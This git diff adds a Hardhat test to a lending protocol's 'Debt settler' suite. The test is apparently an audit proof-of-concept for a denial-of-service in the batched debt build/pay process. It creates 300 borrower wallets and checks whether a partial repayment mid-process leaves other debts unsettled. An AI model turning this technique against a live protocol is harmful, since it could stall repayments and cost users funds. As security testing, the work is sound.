@@ -513,6 +513,102 @@ describe('Debt settler', async function () {
       expect(payReceipt.gasUsed).to.be.lessThan(2e6)
     })
 
+    it.only('REPAYMENT - debt building process DoS', async function () {
+      const fixtures = await loadFixture(deploy)
+      const {
+        alice,
+        bob,
+        cPool,
+        lPool,
+        debtSettler,
+        token,
+        treasury,
+      } = fixtures
+      await setupCollateral(fixtures)
+      // Add liquidity & Repayment
+      await token.mint(lPool.address, 50e18 + '')
+      // await lPool.togglePause();
+      // Bob incurs in a big debt before the build call
+      // generate token balance
+      await token.mint(bob.address, ethers.utils.parseEther("1000"))
+      // approve and deposit
+      await token.connect(bob).approve(cPool.address, ethers.utils.parseEther("100"))
+      await expect(cPool.connect(bob)['deposit(uint256)'](ethers.utils.parseEther("100"))).to.emit(cPool, 'Deposit')
+      await lPool.connect(bob).borrow(ethers.utils.parseEther("10"))
+      let bobsDebt = await lPool['debt(address)'](bob.address)
+      expect(bobsDebt).to.be.eq(ethers.utils.parseEther("10"))
+      console.log(`0) Total Debt: ${(await lPool.totalDebt()).toString()}`);
+      // Rest of borrowers
+      let amountOfBorrowers = 300
+      let borrowers = [];
+      for (let index = 0; index < amountOfBorrowers; index++) {
+        // get a signer
+        let curSigner = ethers.Wallet.createRandom()
+        // add it to Hardhat Network
+        curSigner = curSigner.connect(ethers.provider)
+        borrowers.push(curSigner);
+        // send some gas ether
+        await alice.sendTransaction({to: curSigner.address, value: ethers.utils.parseEther('0.3')})
+        // generate token balance
+        await token.mint(curSigner.address, 1e18 + '')
+        // approve and deposit
+        await token.connect(curSigner).approve(cPool.address, 100e18 + '')
+        await expect(cPool.connect(curSigner)['deposit(uint256)'](1e17 + '')).to.emit(cPool, 'Deposit')
+        await lPool.connect(curSigner).borrow(1e15 + '')
+        let signerDebt = await lPool['debt(address)'](curSigner.address)
+
+        expect(signerDebt).to.be.eq(1e15)
+      }
+      // Since bob is the first in the enumerable mapping, his debt position is built in the first call
+      await token.mint(treasury.address, 100e18 + '')
+      await token.connect(treasury).transfer(debtSettler.address, ethers.utils.parseEther('10')) // Amt less than total debt
+      console.log(`1) Total Debt: ${(await lPool.totalDebt()).toString()}`);
+      bobsDebt =  await lPool['debt(address)'](bob.address)
+      console.log(`Bobs debt: ${bobsDebt.toString()}`)
+      let buildTx = await debtSettler.connect(treasury).build({gasLimit: 10e6 })
+      let buildReceipt = await buildTx.wait()
+      expect(buildReceipt.gasUsed).to.be.greaterThan(9e6)
+      console.log(`2) Total Debt: ${(await lPool.totalDebt()).toString()}`);
+      // Bob now decides to repay his debt
+      await token.connect(bob).approve(lPool.address, ethers.utils.parseEther("100"))
+      await lPool.connect(bob).repay(ethers.utils.parseEther("0.01")) // Repays a part of his debt
+      bobsDebt = await lPool['debt(address)'](bob.address)
+      console.log(`Bobs debt: ${bobsDebt.toString()}`)
+      buildTx = await debtSettler.connect(treasury).build({gasLimit: 10e6 })
+      buildReceipt = await buildTx.wait()
+      // expect(buildReceipt.gasUsed).to.be.greaterThan(7e6)
+      console.log(`3) Total Debt: ${(await lPool.totalDebt()).toString()}`);
+      buildTx = await debtSettler.connect(treasury).build()
+      buildReceipt = await buildTx.wait()
+      // expect(buildReceipt.gasUsed).to.be.lessThan(5e6) // last only process 50 borrowers so should be left a few
+      console.log(`Balance of Settler: ${(await token.balanceOf(debtSettler.address)).toString()}`);
+      let buildReceipt2 = await (await debtSettler.pay({gasLimit: 10e6})).wait()
+      // expect(buildReceipt2.gasUsed).to.be.greaterThan(8e6)
+      console.log(`Balance of Settler: ${(await token.balanceOf(debtSettler.address)).toString()}`);
+      buildReceipt2 = await (await debtSettler.pay({gasLimit: 10e6})).wait()
+      // expect(buildReceipt2.gasUsed).to.be.lessThan(2e6)
+      // this one will run without paying
+      console.log(`Balance of Settler: ${(await token.balanceOf(debtSettler.address)).toString()}`);
+      await (await debtSettler.pay()).wait()
+      await (await debtSettler.pay()).wait()
+      await (await debtSettler.pay()).wait()
+      // expect(buildReceipt2.gasUsed).to.be.lessThan(6e6)
+      // Check if the other users had their debt repaid
+      for (let index = 0; index < amountOfBorrowers; index++) {
+        // get a signer
+        let curSigner = borrowers[index];
+        // add it to Hardhat Network
+        curSigner = curSigner.connect(ethers.provider)
+        let signerDebt = await lPool['debt(address)'](curSigner.address)
+        if (signerDebt.toString() != '0') {
+          console.log(`Signer with ${signerDebt.toString()} debt`)
+}
+        // expect(signerDebt).to.be.gt(0)
+      }
+      bobsDebt = await lPool['debt(address)'](bob.address)
+      console.log(`Bobs debt: ${bobsDebt.toString()}`)
+    })
+
     it('Should not reset indexes', async function () {
       const { bob, debtSettler } = await loadFixture(deploy)
 
